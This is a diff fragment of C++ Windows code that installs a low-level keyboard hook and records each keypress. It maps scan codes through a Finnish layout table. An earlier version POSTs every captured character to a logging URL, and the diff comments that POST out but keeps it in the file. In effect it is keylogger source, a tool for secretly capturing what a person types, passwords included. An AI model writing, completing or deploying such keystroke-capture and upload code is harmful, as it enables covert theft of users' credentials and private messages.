@@ -2,22 +2,22 @@
 #include <Windows.h>
 #include <cpr/cpr.h>
 
+#include "layouts.h"
+
 const char* DEBUG_URL = "http://127.0.0.1:8000/log";
+
 
 LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
     auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
-    if (wParam ==WM_KEYDOWN) {
+    if (wParam == WM_KEYDOWN) {
         char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
-        printf("%c\n", c);
+        printf("%d / %s\n",kbStruct->scanCode, scanCodeMapFI.find(kbStruct->scanCode)->second.c_str());
 
-        std::string body = "";
-        body += c;
+        //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
+       // cpr::Body{"{\"text\": \"" + body + "\"}"});
 
-        const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
-        cpr::Body{"{\"text\": \"" + body + "\"}"});
-
-        printf("%s\n", r.text.c_str());
+       // printf("%s\n", r.text.c_str());
     }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
